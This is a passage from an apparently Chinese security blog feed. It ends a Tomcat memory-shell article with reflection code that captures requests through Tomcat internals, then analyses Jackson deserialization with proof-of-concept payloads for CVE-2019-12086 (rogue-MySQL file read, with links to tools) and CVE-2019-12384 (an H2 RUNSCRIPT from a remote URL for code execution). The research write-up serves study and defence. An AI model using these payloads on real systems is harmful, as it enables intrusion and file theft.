class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat-架构原理-Tomcat内存马&quot;&gt;&lt;a href=&quot;#Tomcat-架构原理-Tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;Tomcat 架构原理 &amp;amp; Tomcat内存马&quot;&gt;&lt;/a&gt;Tomcat 架构原理 &amp;amp;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Jackson反序列化</title>
    <link href="http://example.com/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-09-10T06:36:34.000Z</published>
    <updated>2025-09-10T06:38:27.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用Jackson"><a href="#使用Jackson" class="headerlink" title="使用Jackson"></a>使用Jackson</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;default construct&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Constructor&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setNAme&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(person);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(person1);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">//Constructor getName  </span></span><br><span class="line"><span class="comment">//getAge  </span></span><br><span class="line"><span class="comment">//&#123;&quot;name&quot;:&quot;n4c1&quot;,&quot;age&quot;:20&#125;  </span></span><br><span class="line"><span class="comment">//default construct setNAme  </span></span><br><span class="line"><span class="comment">//setAge  </span></span><br><span class="line"><span class="comment">//org.n4c1.unserial.jackson.Person@58651fd0</span></span><br></pre></td></tr></table></figure><p>被反序列化的类必须拥有一个无参构造器</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>大致过一遍jackson反序列化流程</p><p>断点打在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br></pre></td></tr></table></figure><p>这一行, 跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810224836.png" alt="image.png"><br>可以看见给<code>_readMapAndClose</code>传了两个参数, 一个是<code>_jsonFactory.createParser</code>构建的<code>词法解析器</code>, 一个是<code>_typeFactory.constructType</code>构建的<code>type类型</code><br>词法解析器就没什么好看的, 不太可能涉及对象创建的方法调用</p><h3 id="SimpleType的创建"><a href="#SimpleType的创建" class="headerlink" title="SimpleType的创建"></a><code>SimpleType</code>的创建</h3><p>先看一下<code>_typeFactory.constructType</code>方法, 看看传进去的type是什么, 如何而来</p><p>跟进到<code>_fromAny</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225309.png" alt="image.png"><br>首先是对期望类(Person.class)的类型判断, 这里是Class<br>跟进到<code>_fromClass</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225642.png" alt="image.png"><br>首先是<code>_findWellKnownSimple</code>对基本类型的判断<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225714.png" alt="image.png"><br>当然我们这里是自定义的类型, 会返回null</p><p>之后往下, 看起来是从最近构建的对象中查找, 类似缓存机制 由<code>bindings</code>和<code>_typeCache</code>这两个属性存储<br>当然这里是找不到的</p><p>之后实例了一个ClassStack作为context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230324.png" alt="image.png"></p><p>大概还是用于还原对象, 这并不重要</p><p>中间一段是判断数组, 获取父类等, 不重要<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230505.png" alt="image.png"></p><p>关键在于<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231617.png" alt="image.png"><br>这里会调用<code>_newSimpleType</code>来创建一个新的<code>SimpleType</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231731.png" alt="image.png"><br>返回的结果其实就是把我们自定义的<code>Person</code>类包装成类jackson自己的<code>SimpleType</code>来作为反序列化结果的类型<br>之后就是把得到的这个<code>SimpleType</code>放进<code>_typeCache</code>然后返回<br>那么我们还是回到<code>_readMapAndClose</code>看看实质上的反序列化过程</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810232247.png" alt="image.png"><br>可以看见4009行的获取反序列化器, 这个逻辑其实和fastjson很相似, 对不同的类型有不同的反序列化器, 这里获取到的应该是JavaBean反序列化器<br>具体创建过程先掠过, 直接去看反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233007.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233056.png" alt="image.png"><br>跟进</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233121.png" alt="image.png"><br>跟进<code>_valueInstantiator.createUsingDefault</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233209.png" alt="image.png"><br>直接调用到了Person类的构造器, 这个构造器应该就是在创建反序列化器的时候获取到的</p><p>接下来就是反序列化bean的property<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233420.png" alt="image.png"><br>跟进prop.deserializeAndSet<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233539.png" alt="image.png"><br>可以看见对setter进行了调用</p><p>所以对于这个<code>BeanDeserializer</code>有以下关键属性</p><ol><li><code>_valueInstantiator</code>: 记录了类的基本信息, 包括构造器, class信息, 用来实例化bean</li><li><code>_beanProperties</code>: 记录bean property信息, 包括名称, 字段的反序列化器, setter方法</li></ol><p>之后就是把得到的属性set到类实例中, 反序列化就基本上结束了</p><h2 id="CVE-2019-12086-mysql-fileRead"><a href="#CVE-2019-12086-mysql-fileRead" class="headerlink" title="CVE-2019-12086 mysql fileRead"></a>CVE-2019-12086 mysql fileRead</h2><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;com.mysql.cj.jdbc.admin.MiniAdmin\&quot;, \&quot;jdbc:mysql://127.0.0.1:3306/\&quot;]&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>漏洞范围在 2.x - 2.9.9</li><li>被攻击的程序 classpath 中要有 8.0.14 以下的版本的 Mysql 驱动</li><li>可被攻击的类 <code>com.mysql.cj.jdbc.admin.MiniAdmin</code></li></ul><p>这个打的是mysql fakeServer文件读取</p><p><strong>利用工具</strong></p><blockquote><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a><br><a href="https://github.com/BeichenDream/MysqlT/">https://github.com/BeichenDream/MysqlT/</a></p></blockquote><p>依赖<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2019-12384-h2-RCE"><a href="#CVE-2019-12384-h2-RCE" class="headerlink" title="CVE-2019-12384 h2 RCE"></a>CVE-2019-12384 h2 RCE</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0-alpha4<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2rce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        objectMapper.enableDefaultTyping();<span class="comment">//开启 defaultTyping        </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectMapper.readValue(json, Object.class);<span class="comment">//反序列化对象  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(o);<span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DriverManagerConnectionSource.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DriverManagerConnectionSource</span> <span class="keyword">extends</span> <span class="title class_">ConnectionSourceBase</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">driverClass</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (driverClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">                Class.forName(driverClass);  </span><br><span class="line">                discoverConnectionProperties();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                addError(<span class="string">&quot;WARNING: No JDBC driver specified for logback DriverManagerConnectionSource.&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;  </span><br><span class="line">            addError(<span class="string">&quot;Could not load JDBC driver class: &quot;</span> + driverClass, cnfe);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> ch.qos.logback.core.db.ConnectionSource#getConnection()  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (getUser() == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url, getUser(), getPassword());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the url.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getUrl</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Sets the url.     ** <span class="doctag">@param</span> url  </span></span><br><span class="line"><span class="comment">     *          The url to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUrl</span><span class="params">(String url)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.url = url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the name of the driver class.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getDriverClass</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  